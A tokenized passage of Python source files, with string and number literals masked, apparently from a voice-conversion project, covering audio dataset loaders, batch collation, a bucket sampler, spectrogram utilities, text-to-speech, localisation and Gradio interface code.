<EOL> phone = np . load ( phone ) <EOL> phone = np . repeat ( phone , <NUM_LIT> , axis = <NUM_LIT> ) <EOL> pitch = np . load ( pitch ) <EOL> pitchf = np . load ( pitchf ) <EOL> n_num = min ( phone . shape [ <NUM_LIT> ] , <NUM_LIT> ) <EOL> phone = phone [ : n_num , : ] <EOL> pitch = pitch [ : n_num ] <EOL> pitchf = pitchf [ : n_num ] <EOL> phone = torch . FloatTensor ( phone ) <EOL> pitch = torch . LongTensor ( pitch ) <EOL> pitchf = torch . FloatTensor ( pitchf ) <EOL> return phone , pitch , pitchf <EOL> def get_audio ( self , filename ) : <EOL> audio , sampling_rate = load_wav_to_torch ( filename ) <EOL> if sampling_rate != self . sampling_rate : <EOL> raise ValueError ( <EOL> "<STR_LIT>" . format ( <EOL> sampling_rate , self . sampling_rate <EOL> ) <EOL> ) <EOL> audio_norm = audio <EOL> audio_norm = audio_norm . unsqueeze ( <NUM_LIT> ) <EOL> spec_filename = filename . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if os . path . exists ( spec_filename ) : <EOL> try : <EOL> spec = torch . load ( spec_filename ) <EOL> except Exception as error : <EOL> print ( f"<STR_LIT>" ) <EOL> spec = spectrogram_torch ( <EOL> audio_norm , <EOL> self . filter_length , <EOL> self . hop_length , <EOL> self . win_length , <EOL> center = False , <EOL> ) <EOL> spec = torch . squeeze ( spec , <NUM_LIT> ) <EOL> torch . save ( spec , spec_filename , _use_new_zipfile_serialization = False ) <EOL> else : <EOL> spec = spectrogram_torch ( <EOL> audio_norm , <EOL> self . filter_length , <EOL> self . hop_length , <EOL> self . win_length , <EOL> center = False , <EOL> ) <EOL> spec = torch . squeeze ( spec , <NUM_LIT> ) <EOL> torch . save ( spec , spec_filename , _use_new_zipfile_serialization = False ) <EOL> return spec , audio_norm <EOL> def __getitem__ ( self , index ) : <EOL> return self . get_audio_text_pair ( self . audiopaths_and_text [ index ] ) <EOL> def __len__ ( self ) : <EOL> return len ( self . audiopaths_and_text ) <EOL> class TextAudioCollateMultiNSFsid : <EOL> def __init__ ( self , return_ids = False ) : <EOL> self . return_ids = return_ids <EOL> def __call__ ( self , batch ) : <EOL> _ , ids_sorted_decreasing = torch . sort ( <EOL> torch . LongTensor ( [ x [ <NUM_LIT> ] . size ( <NUM_LIT> ) for x in batch ] ) , dim = <NUM_LIT> , descending = True <EOL> ) <EOL> max_spec_len = max ( [ x [ <NUM_LIT> ] . size ( <NUM_LIT> ) for x in batch ] ) <EOL> max_wave_len = max ( [ x [ <NUM_LIT> ] . size ( <NUM_LIT> ) for x in batch ] ) <EOL> spec_lengths = torch . LongTensor ( len ( batch ) ) <EOL> wave_lengths = torch . LongTensor ( len ( batch ) ) <EOL> spec_padded = torch . FloatTensor ( len ( batch ) , batch [ <NUM_LIT> ] [ <NUM_LIT> ] . size ( <NUM_LIT> ) , max_spec_len ) <EOL> wave_padded = torch . FloatTensor ( len ( batch ) , <NUM_LIT> , max_wave_len ) <EOL> spec_padded . zero_ ( ) <EOL> wave_padded . zero_ ( ) <EOL> max_phone_len = max ( [ x [ <NUM_LIT> ] . size ( <NUM_LIT> ) for x in batch ] ) <EOL> phone_lengths = torch . LongTensor ( len ( batch ) ) <EOL> phone_padded = torch . FloatTensor ( <EOL> len ( batch ) , max_phone_len , batch [ <NUM_LIT> ] [ <NUM_LIT> ] . shape [ <NUM_LIT> ] <EOL> ) <EOL> pitch_padded = torch . LongTensor ( len ( batch ) , max_phone_len ) <EOL> pitchf_padded = torch . FloatTensor ( len ( batch ) , max_phone_len ) <EOL> phone_padded . zero_ ( ) <EOL> pitch_padded . zero_ ( ) <EOL> pitchf_padded . zero_ ( ) <EOL> sid = torch . LongTensor ( len ( batch ) ) <EOL> for i in range ( len ( ids_sorted_decreasing ) ) : <EOL> row = batch [ ids_sorted_decreasing [ i ] ] <EOL> spec = row [ <NUM_LIT> ] <EOL> spec_padded [ i , : , : spec . size ( <NUM_LIT> ) ] = spec <EOL> spec_lengths [ i ] = spec . size ( <NUM_LIT> ) <EOL> wave = row [ <NUM_LIT> ] <EOL> wave_padded [ i , : , : wave . size ( <NUM_LIT> ) ] = wave <EOL> wave_lengths [ i ] = wave . size ( <NUM_LIT> ) <EOL> phone = row [ <NUM_LIT> ] <EOL> phone_padded [ i , : phone . size ( <NUM_LIT> ) , : ] = phone <EOL> phone_lengths [ i ] = phone . size ( <NUM_LIT> ) <EOL> pitch = row [ <NUM_LIT> ] <EOL> pitch_padded [ i , : pitch . size ( <NUM_LIT> ) ] = pitch <EOL> pitchf = row [ <NUM_LIT> ] <EOL> pitchf_padded [ i , : pitchf . size ( <NUM_LIT> ) ] = pitchf <EOL> sid [ i ] = row [ <NUM_LIT> ] <EOL> return ( <EOL> phone_padded , <EOL> phone_lengths , <EOL> pitch_padded , <EOL> pitchf_padded , <EOL> spec_padded , <EOL> spec_lengths , <EOL> wave_padded , <EOL> wave_lengths , <EOL> sid , <EOL> ) <EOL> class TextAudioLoader ( torch . utils . data . Dataset ) : <EOL> def __init__ ( self , hparams ) : <EOL> self . audiopaths_and_text = load_filepaths_and_text ( hparams . training_files ) <EOL> self . max_wav_value = hparams . max_wav_value <EOL> self . sampling_rate = hparams . sampling_rate <EOL> self . filter_length = hparams . filter_length <EOL> self . hop_length = hparams . hop_length <EOL> self . win_length = hparams . win_length <EOL> self . sampling_rate = hparams . sampling_rate <EOL> self . min_text_len = getattr ( hparams , "<STR_LIT>" , <NUM_LIT> ) <EOL> self . max_text_len = getattr ( hparams , "<STR_LIT>" , <NUM_LIT> ) <EOL> self . _filter ( ) <EOL> def _filter ( self ) : <EOL> audiopaths_and_text_new = [ ] <EOL> lengths = [ ] <EOL> for entry in self . audiopaths_and_text : <EOL> if len ( entry ) >= <NUM_LIT> : <EOL> audiopath , text , dv = entry [ : <NUM_LIT> ] <EOL> if self . min_text_len <= len ( text ) and len ( text ) <= self . max_text_len : <EOL> audiopaths_and_text_new . append ( [ audiopath , text , dv ] ) <EOL> lengths . append ( os . path . getsize ( audiopath ) // ( <NUM_LIT> * self . hop_length ) ) <EOL> self . audiopaths_and_text = audiopaths_and_text_new <EOL> self . lengths = lengths <EOL> def get_sid ( self , sid ) : <EOL> sid = os . path . basename ( os . path . dirname ( sid ) ) <EOL> try : <EOL> sid = torch . LongTensor ( [ int ( "<STR_LIT>" . join ( filter ( str . isdigit , sid ) ) ) ] ) <EOL> except ValueError as error : <EOL> print ( f"<STR_LIT>" ) <EOL> sid = torch . LongTensor ( [ <NUM_LIT> ] ) <EOL> return sid <EOL> def get_audio_text_pair ( self , audiopath_and_text ) : <EOL> file = audiopath_and_text [ <NUM_LIT> ] <EOL> phone = audiopath_and_text [ <NUM_LIT> ] <EOL> dv = audiopath_and_text [ <NUM_LIT> ] <EOL> phone = self . get_labels ( phone ) <EOL> spec , wav = self . get_audio ( file ) <EOL> dv = self . get_sid ( dv ) <EOL> len_phone = phone . size ( ) [ <NUM_LIT> ] <EOL> len_spec = spec . size ( ) [ - <NUM_LIT> ] <EOL> if len_phone != len_spec : <EOL> len_min = min ( len_phone , len_spec ) <EOL> len_wav = len_min * self . hop_length <EOL> spec = spec [ : , : len_min ] <EOL> wav = wav [ : , : len_wav ] <EOL> phone = phone [ : len_min , : ] <EOL> return ( spec , wav , phone , dv ) <EOL> def get_labels ( self , phone ) : <EOL> phone = np . load ( phone ) <EOL> phone = np . repeat ( phone , <NUM_LIT> , axis = <NUM_LIT> ) <EOL> n_num = min ( phone . shape [ <NUM_LIT> ] , <NUM_LIT> ) <EOL> phone = phone [ : n_num , : ] <EOL> phone = torch . FloatTensor ( phone ) <EOL> return phone <EOL> def get_audio ( self , filename ) : <EOL> audio , sampling_rate = load_wav_to_torch ( filename ) <EOL> if sampling_rate != self . sampling_rate : <EOL> raise ValueError ( <EOL> "<STR_LIT>" . format ( <EOL> sampling_rate , self . sampling_rate <EOL> ) <EOL> ) <EOL> audio_norm = audio <EOL> audio_norm = audio_norm . unsqueeze ( <NUM_LIT> ) <EOL> spec_filename = filename . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if os . path . exists ( spec_filename ) : <EOL> try : <EOL> spec = torch . load ( spec_filename ) <EOL> except Exception as error : <EOL> print ( f"<STR_LIT>" ) <EOL> spec = spectrogram_torch ( <EOL> audio_norm , <EOL> self . filter_length , <EOL> self . hop_length , <EOL> self . win_length , <EOL> center = False , <EOL> ) <EOL> spec = torch . squeeze ( spec , <NUM_LIT> ) <EOL> torch . save ( spec , spec_filename , _use_new_zipfile_serialization = False ) <EOL> else : <EOL> spec = spectrogram_torch ( <EOL> audio_norm , <EOL> self . filter_length , <EOL> self . hop_length , <EOL> self . win_length , <EOL> center = False , <EOL> ) <EOL> spec = torch . squeeze ( spec , <NUM_LIT> ) <EOL> torch . save ( spec , spec_filename , _use_new_zipfile_serialization = False ) <EOL> return spec , audio_norm <EOL> def __getitem__ ( self , index ) : <EOL> return self . get_audio_text_pair ( self . audiopaths_and_text [ index ] ) <EOL> def __len__ ( self ) : <EOL> return len ( self . audiopaths_and_text ) <EOL> class TextAudioCollate : <EOL> def __init__ ( self , return_ids = False ) : <EOL> self . return_ids = return_ids <EOL> def __call__ ( self , batch ) : <EOL> _ , ids_sorted_decreasing = torch . sort ( <EOL> torch . LongTensor ( [ x [ <NUM_LIT> ] . size ( <NUM_LIT> ) for x in batch ] ) , dim = <NUM_LIT> , descending = True <EOL> ) <EOL> max_spec_len = max ( [ x [ <NUM_LIT> ] . size ( <NUM_LIT> ) for x in batch ] ) <EOL> max_wave_len = max ( [ x [ <NUM_LIT> ] . size ( <NUM_LIT> ) for x in batch ] ) <EOL> spec_lengths = torch . LongTensor ( len ( batch ) ) <EOL> wave_lengths = torch . LongTensor ( len ( batch ) ) <EOL> spec_padded = torch . FloatTensor ( len ( batch ) , batch [ <NUM_LIT> ] [ <NUM_LIT> ] . size ( <NUM_LIT> ) , max_spec_len ) <EOL> wave_padded = torch . FloatTensor ( len ( batch ) , <NUM_LIT> , max_wave_len ) <EOL> spec_padded . zero_ ( ) <EOL> wave_padded . zero_ ( ) <EOL> max_phone_len = max ( [ x [ <NUM_LIT> ] . size ( <NUM_LIT> ) for x in batch ] ) <EOL> phone_lengths = torch . LongTensor ( len ( batch ) ) <EOL> phone_padded = torch . FloatTensor ( <EOL> len ( batch ) , max_phone_len , batch [ <NUM_LIT> ] [ <NUM_LIT> ] . shape [ <NUM_LIT> ] <EOL> ) <EOL> phone_padded . zero_ ( ) <EOL> sid = torch . LongTensor ( len ( batch ) ) <EOL> for i in range ( len ( ids_sorted_decreasing ) ) : <EOL> row = batch [ ids_sorted_decreasing [ i ] ] <EOL> spec = row [ <NUM_LIT> ] <EOL> spec_padded [ i , : , : spec . size ( <NUM_LIT> ) ] = spec <EOL> spec_lengths [ i ] = spec . size ( <NUM_LIT> ) <EOL> wave = row [ <NUM_LIT> ] <EOL> wave_padded [ i , : , : wave . size ( <NUM_LIT> ) ] = wave <EOL> wave_lengths [ i ] = wave . size ( <NUM_LIT> ) <EOL> phone = row [ <NUM_LIT> ] <EOL> phone_padded [ i , : phone . size ( <NUM_LIT> ) , : ] = phone <EOL> phone_lengths [ i ] = phone . size ( <NUM_LIT> ) <EOL> sid [ i ] = row [ <NUM_LIT> ] <EOL> return ( <EOL> phone_padded , <EOL> phone_lengths , <EOL> spec_padded , <EOL> spec_lengths , <EOL> wave_padded , <EOL> wave_lengths , <EOL> sid , <EOL> ) <EOL> class DistributedBucketSampler ( torch . utils . data . distributed . DistributedSampler ) : <EOL> def __init__ ( <EOL> self , <EOL> dataset , <EOL> batch_size , <EOL> boundaries , <EOL> num_replicas = None , <EOL> rank = None , <EOL> shuffle = True , <EOL> ) : <EOL> super ( ) . __init__ ( dataset , num_replicas = num_replicas , rank = rank , shuffle = shuffle ) <EOL> self . lengths = dataset . lengths <EOL> self . batch_size = batch_size <EOL> self . boundaries = boundaries <EOL> self . buckets , self . num_samples_per_bucket = self . _create_buckets ( ) <EOL> self . total_size = sum ( self . num_samples_per_bucket ) <EOL> self . num_samples = self . total_size // self . num_replicas <EOL> def _create_buckets ( self ) : <EOL> buckets = [ [ ] for _ in range ( len ( self . boundaries ) - <NUM_LIT> ) ] <EOL> for i in range ( len ( self . lengths ) ) : <EOL> length = self . lengths [ i ] <EOL> idx_bucket = self . _bisect ( length ) <EOL> if idx_bucket != - <NUM_LIT> : <EOL> buckets [ idx_bucket ] . append ( i ) <EOL> for i in range ( len ( buckets ) - <NUM_LIT> , - <NUM_LIT> , - <NUM_LIT> ) : <EOL> if len ( buckets [ i ] ) == <NUM_LIT> : <EOL> buckets . pop ( i ) <EOL> self . boundaries . pop ( i + <NUM_LIT> ) <EOL> num_samples_per_bucket = [ ] <EOL> for i in range ( len ( buckets ) ) : <EOL> len_bucket = len ( buckets [ i ] ) <EOL> total_batch_size = self . num_replicas * self . batch_size <EOL> rem = ( <EOL> total_batch_size - ( len_bucket % total_batch_size ) <EOL> ) % total_batch_size <EOL> num_samples_per_bucket . append ( len_bucket + rem ) <EOL> return buckets , num_samples_per_bucket <EOL> def __iter__ ( self ) : <EOL> g = torch . Generator ( ) <EOL> g . manual_seed ( self . epoch ) <EOL> indices = [ ] <EOL> if self . shuffle : <EOL> for bucket in self . buckets : <EOL> indices . append ( torch . randperm ( len ( bucket ) , generator = g ) . tolist ( ) ) <EOL> else : <EOL> for bucket in self . buckets : <EOL> indices . append ( list ( range ( len ( bucket ) ) ) ) <EOL> batches = [ ] <EOL> for i in range ( len ( self . buckets ) ) : <EOL> bucket = self . buckets [ i ] <EOL> len_bucket = len ( bucket ) <EOL> ids_bucket = indices [ i ] <EOL> num_samples_bucket = self . num_samples_per_bucket [ i ] <EOL> rem = num_samples_bucket - len_bucket <EOL> ids_bucket = ( <EOL> ids_bucket <EOL> + ids_bucket * ( rem // len_bucket ) <EOL> + ids_bucket [ : ( rem % len_bucket ) ] <EOL> ) <EOL> ids_bucket = ids_bucket [ self . rank : : self . num_replicas ] <EOL> for j in range ( len ( ids_bucket ) // self . batch_size ) : <EOL> batch = [ <EOL> bucket [ idx ] <EOL> for idx in ids_bucket [ <EOL> j * self . batch_size : ( j + <NUM_LIT> ) * self . batch_size <EOL> ] <EOL> ] <EOL> batches . append ( batch ) <EOL> if self . shuffle : <EOL> batch_ids = torch . randperm ( len ( batches ) , generator = g ) . tolist ( ) <EOL> batches = [ batches [ i ] for i in batch_ids ] <EOL> self . batches = batches <EOL> assert len ( self . batches ) * self . batch_size == self . num_samples <EOL> return iter ( self . batches ) <EOL> def _bisect ( self , x , lo = <NUM_LIT> , hi = None ) : <EOL> if hi is None : <EOL> hi = len ( self . boundaries ) - <NUM_LIT> <EOL> if hi > lo : <EOL> mid = ( hi + lo ) // <NUM_LIT> <EOL> if self . boundaries [ mid ] < x and x <= self . boundaries [ mid + <NUM_LIT> ] : <EOL> return mid <EOL> elif x <= self . boundaries [ mid ] : <EOL> return self . _bisect ( x , lo , mid ) <EOL> else : <EOL> return self . _bisect ( x , mid + <NUM_LIT> , hi ) <EOL> else : <EOL> return - <NUM_LIT> <EOL> def __len__ ( self ) : <EOL> return self . num_samples // self . batch_size <EOL> </s>
<s> import sys <EOL> import asyncio <EOL> import edge_tts <EOL> async def main ( ) : <EOL> text = sys . argv [ <NUM_LIT> ] <EOL> voice = sys . argv [ <NUM_LIT> ] <EOL> output_file = sys . argv [ <NUM_LIT> ] <EOL> await edge_tts . Communicate ( text , voice ) . save ( output_file ) <EOL> print ( f"<STR_LIT>" ) <EOL> if __name__ == "<STR_LIT>" : <EOL> asyncio . run ( main ( ) ) <EOL> </s>
<s> import sys <EOL> import os <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> class InstallationError ( Exception ) : <EOL> def __init__ ( self , message = "<STR_LIT>" ) : <EOL> self . message = message <EOL> super ( ) . __init__ ( self . message ) <EOL> def check_installation ( ) : <EOL> try : <EOL> system_drive = os . getenv ( "<STR_LIT>" ) <EOL> current_drive = os . path . splitdrive ( now_dir ) [ <NUM_LIT> ] <EOL> if current_drive . upper ( ) != system_drive . upper ( ) : <EOL> raise InstallationError ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> except : <EOL> pass <EOL> else : <EOL> if "<STR_LIT>" in now_dir : <EOL> raise InstallationError ( <EOL> "<STR_LIT>" <EOL> ) <EOL> elif "<STR_LIT>" in now_dir : <EOL> raise InstallationError ( <EOL> "<STR_LIT>" <EOL> ) <EOL> try : <EOL> now_dir . encode ( "<STR_LIT>" ) <EOL> except UnicodeEncodeError : <EOL> raise InstallationError ( <EOL> "<STR_LIT>" <EOL> ) <EOL> </s>
<s> import os , sys <EOL> import json <EOL> from pathlib import Path <EOL> from locale import getdefaultlocale <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> class I18nAuto : <EOL> LANGUAGE_PATH = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> def __init__ ( self , language = None ) : <EOL> with open ( <EOL> os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" ) , "<STR_LIT>" , encoding = "<STR_LIT>" <EOL> ) as file : <EOL> config = json . load ( file ) <EOL> override = config [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> lang_prefix = config [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> self . language = lang_prefix <EOL> if override == False : <EOL> language = language or getdefaultlocale ( ) [ <NUM_LIT> ] <EOL> lang_prefix = language [ : <NUM_LIT> ] if language is not None else "<STR_LIT>" <EOL> available_languages = self . _get_available_languages ( ) <EOL> matching_languages = [ <EOL> lang for lang in available_languages if lang . startswith ( lang_prefix ) <EOL> ] <EOL> self . language = matching_languages [ <NUM_LIT> ] if matching_languages else "<STR_LIT>" <EOL> self . language_map = self . _load_language_list ( ) <EOL> def _load_language_list ( self ) : <EOL> try : <EOL> file_path = Path ( self . LANGUAGE_PATH ) / f"<STR_LIT>" <EOL> with open ( file_path , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> return json . load ( file ) <EOL> except FileNotFoundError : <EOL> raise FileNotFoundError ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> def _get_available_languages ( self ) : <EOL> language_files = [ path . stem for path in Path ( self . LANGUAGE_PATH ) . glob ( "<STR_LIT>" ) ] <EOL> return language_files <EOL> def _language_exists ( self , language ) : <EOL> return ( Path ( self . LANGUAGE_PATH ) / f"<STR_LIT>" ) . exists ( ) <EOL> def __call__ ( self , key ) : <EOL> return self . language_map . get ( key , key ) <EOL> </s>
<s> import torch <EOL> import torch . utils . data <EOL> from librosa . filters import mel as librosa_mel_fn <EOL> def dynamic_range_compression_torch ( x , C = <NUM_LIT> , clip_val = <NUM_LIT> ) : <EOL> return torch . log ( torch . clamp ( x , min = clip_val ) * C ) <EOL> def dynamic_range_decompression_torch ( x , C = <NUM_LIT> ) : <EOL> return torch . exp ( x ) / C <EOL> def spectral_normalize_torch ( magnitudes ) : <EOL> return dynamic_range_compression_torch ( magnitudes ) <EOL> def spectral_de_normalize_torch ( magnitudes ) : <EOL> return dynamic_range_decompression_torch ( magnitudes ) <EOL> mel_basis = { } <EOL> hann_window = { } <EOL> def spectrogram_torch ( y , n_fft , hop_size , win_size , center = False ) : <EOL> global hann_window <EOL> dtype_device = str ( y . dtype ) + "<STR_LIT>" + str ( y . device ) <EOL> wnsize_dtype_device = str ( win_size ) + "<STR_LIT>" + dtype_device <EOL> if wnsize_dtype_device not in hann_window : <EOL> hann_window [ wnsize_dtype_device ] = torch . hann_window ( win_size ) . to ( <EOL> dtype = y . dtype , device = y . device <EOL> ) <EOL> y = torch . nn . functional . pad ( <EOL> y . unsqueeze ( <NUM_LIT> ) , <EOL> ( int ( ( n_fft - hop_size ) / <NUM_LIT> ) , int ( ( n_fft - hop_size ) / <NUM_LIT> ) ) , <EOL> mode = "<STR_LIT>" , <EOL> ) <EOL> y = y . squeeze ( <NUM_LIT> ) <EOL> spec = torch . stft ( <EOL> y , <EOL> n_fft , <EOL> hop_length = hop_size , <EOL> win_length = win_size , <EOL> window = hann_window [ wnsize_dtype_device ] , <EOL> center = center , <EOL> pad_mode = "<STR_LIT>" , <EOL> normalized = False , <EOL> onesided = True , <EOL> return_complex = True , <EOL> ) <EOL> spec = torch . sqrt ( spec . real . pow ( <NUM_LIT> ) + spec . imag . pow ( <NUM_LIT> ) + <NUM_LIT> ) <EOL> return spec <EOL> def spec_to_mel_torch ( spec , n_fft , num_mels , sampling_rate , fmin , fmax ) : <EOL> global mel_basis <EOL> dtype_device = str ( spec . dtype ) + "<STR_LIT>" + str ( spec . device ) <EOL> fmax_dtype_device = str ( fmax ) + "<STR_LIT>" + dtype_device <EOL> if fmax_dtype_device not in mel_basis : <EOL> mel = librosa_mel_fn ( <EOL> sr = sampling_rate , n_fft = n_fft , n_mels = num_mels , fmin = fmin , fmax = fmax <EOL> ) <EOL> mel_basis [ fmax_dtype_device ] = torch . from_numpy ( mel ) . to ( <EOL> dtype = spec . dtype , device = spec . device <EOL> ) <EOL> melspec = torch . matmul ( mel_basis [ fmax_dtype_device ] , spec ) <EOL> melspec = spectral_normalize_torch ( melspec ) <EOL> return melspec <EOL> def mel_spectrogram_torch ( <EOL> y , n_fft , num_mels , sampling_rate , hop_size , win_size , fmin , fmax , center = False <EOL> ) : <EOL> spec = spectrogram_torch ( y , n_fft , hop_size , win_size , center ) <EOL> melspec = spec_to_mel_torch ( spec , n_fft , num_mels , sampling_rate , fmin , fmax ) <EOL> return melspec <EOL> </s>
<s> import json <EOL> import os <EOL> import importlib <EOL> import gradio as gr <EOL> now_dir = os . getcwd ( ) <EOL> folder = os . path . dirname ( os . path . abspath ( __file__ ) ) <EOL> folder = os . path . dirname ( folder ) <EOL> folder = os . path . dirname ( folder ) <EOL> folder = os . path . join ( folder , "<STR_LIT>" , "<STR_LIT>" ) <EOL> config_file = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" ) <EOL> import sys <EOL> sys . path . append ( folder ) <EOL> def get_class ( filename ) : <EOL> with open ( filename , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> for line_number , line in enumerate ( file , start = <NUM_LIT> ) : <EOL> if "<STR_LIT>" in line : <EOL> found = line . split ( "<STR_LIT>" ) [ <NUM_LIT> ] . split ( "<STR_LIT>" ) [ <NUM_LIT> ] . split ( "<STR_LIT>" ) [ <NUM_LIT> ] . strip ( ) <EOL> return found <EOL> break <EOL> return None <EOL> def get_list ( ) : <EOL> themes_from_files = [ <EOL> os . path . splitext ( name ) [ <NUM_LIT> ] <EOL> for root , _ , files in os . walk ( folder , topdown = False ) <EOL> for name in files <EOL> if name . endswith ( "<STR_LIT>" ) and root == folder <EOL> ] <EOL> json_file_path = os . path . join ( folder , "<STR_LIT>" ) <EOL> try : <EOL> with open ( json_file_path , "<STR_LIT>" , encoding = "<STR_LIT>" ) as json_file : <EOL> themes_from_url = [ item [ "<STR_LIT>" ] for item in json . load ( json_file ) ] <EOL> except FileNotFoundError : <EOL> themes_from_url = [ ] <EOL> combined_themes = set ( themes_from_files + themes_from_url ) <EOL> return list ( combined_themes ) <EOL> def select_theme ( name ) : <EOL> selected_file = name + "<STR_LIT>" <EOL> full_path = os . path . join ( folder , selected_file ) <EOL> if not os . path . exists ( full_path ) : <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as json_file : <EOL> config_data = json . load ( json_file ) <EOL> config_data [ "<STR_LIT>" ] [ "<STR_LIT>" ] = None <EOL> config_data [ "<STR_LIT>" ] [ "<STR_LIT>" ] = name <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as json_file : <EOL> json . dump ( config_data , json_file , indent = <NUM_LIT> ) <EOL> print ( f"<STR_LIT>" ) <EOL> gr . Info ( f"<STR_LIT>" ) <EOL> return <EOL> class_found = get_class ( full_path ) <EOL> if class_found : <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as json_file : <EOL> config_data = json . load ( json_file ) <EOL> config_data [ "<STR_LIT>" ] [ "<STR_LIT>" ] = selected_file <EOL> config_data [ "<STR_LIT>" ] [ "<STR_LIT>" ] = class_found <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as json_file : <EOL> json . dump ( config_data , json_file , indent = <NUM_LIT> ) <EOL> print ( f"<STR_LIT>" ) <EOL> gr . Info ( f"<STR_LIT>" ) <EOL> else : <EOL> print ( f"<STR_LIT>" ) <EOL> def read_json ( ) : <EOL> try : <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as json_file : <EOL> data = json . load ( json_file ) <EOL> selected_file = data [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> class_name = data [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> if selected_file is not None and class_name : <EOL> return class_name <EOL> elif selected_file == None and class_name : <EOL> return class_name <EOL> else : <EOL> return "<STR_LIT>" <EOL> except Exception as e : <EOL> print ( f"<STR_LIT>" ) <EOL> return "<STR_LIT>" <EOL> def load_json ( ) : <EOL> try : <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as json_file : <EOL> data = json . load ( json_file ) <EOL> selected_file = data [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> class_name = data [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> if selected_file is not None and class_name : <EOL> module = importlib . import_module ( selected_file [ : - <NUM_LIT> ] ) <EOL> obtained_class = getattr ( module , class_name ) <EOL> instance = obtained_class ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> return instance <EOL> elif selected_file == None and class_name : <EOL> return class_name <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> return None <EOL> except Exception as e : <EOL> print ( f"<STR_LIT>" ) <EOL> return None <EOL> </s>
<s> import os , sys <EOL> import gradio as gr <EOL> import shutil <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> from assets . i18n . i18n import I18nAuto <EOL> from core import run_model_blender_script <EOL> i18n = I18nAuto ( ) <EOL> def update_model_fusion ( dropbox ) : <EOL> return dropbox , None <EOL> def voice_blender_tab ( ) : <EOL> gr . Markdown ( i18n ( "<STR_LIT>" ) ) <EOL> gr . Markdown ( <EOL> i18n ( <EOL> "<STR_LIT>" <EOL> ) <EOL> ) <EOL> with gr . Column ( ) : <EOL> model_fusion_name = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> value = "<STR_LIT>" , <EOL> max_lines = <NUM_LIT> , <EOL> interactive = True , <EOL> placeholder = i18n ( "<STR_LIT>" ) , <EOL> ) <EOL> with gr . Row ( ) : <EOL> with gr . Column ( ) : <EOL> model_fusion_a_dropbox = gr . File ( <EOL> label = i18n ( "<STR_LIT>" ) , type = "<STR_LIT>" <EOL> ) <EOL> model_fusion_a = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> placeholder = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> ) <EOL> with gr . Column ( ) : <EOL> model_fusion_b_dropbox = gr . File ( <EOL> label = i18n ( "<STR_LIT>" ) , type = "<STR_LIT>" <EOL> ) <EOL> model_fusion_b = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> value = "<STR_LIT>" , <EOL> interactive = True , <EOL> placeholder = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> ) <EOL> alpha_a = gr . Slider ( <EOL> minimum = <NUM_LIT> , <EOL> maximum = <NUM_LIT> , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> value = <NUM_LIT> , <EOL> interactive = True , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> ) <EOL> model_fusion_button = gr . Button ( i18n ( "<STR_LIT>" ) , variant = "<STR_LIT>" ) <EOL> with gr . Row ( ) : <EOL> model_fusion_output_info = gr . Textbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( "<STR_LIT>" ) , <EOL> value = "<STR_LIT>" , <EOL> ) <EOL> model_fusion_pth_output = gr . File ( <EOL> label = i18n ( "<STR_LIT>" ) , type = "<STR_LIT>" , interactive = False <EOL> ) <EOL> model_fusion_button . click ( <EOL> fn = run_model_blender_script , <EOL> inputs = [ <EOL> model_fusion_name , <EOL> model_fusion_a , <EOL> model_fusion_b , <EOL> alpha_a , <EOL> ] , <EOL> outputs = [ model_fusion_output_info , model_fusion_pth_output ] , <EOL> ) <EOL> model_fusion_a_dropbox . upload ( <EOL> fn = update_model_fusion , <EOL> inputs = model_fusion_a_dropbox , <EOL> outputs = [ model_fusion_a , model_fusion_a_dropbox ] , <EOL> ) <EOL> model_fusion_b_dropbox . upload ( <EOL> fn = update_model_fusion , <EOL> inputs = model_fusion_b_dropbox , <EOL> outputs = [ model_fusion_b , model_fusion_b_dropbox ] , <EOL> ) <EOL> </s>
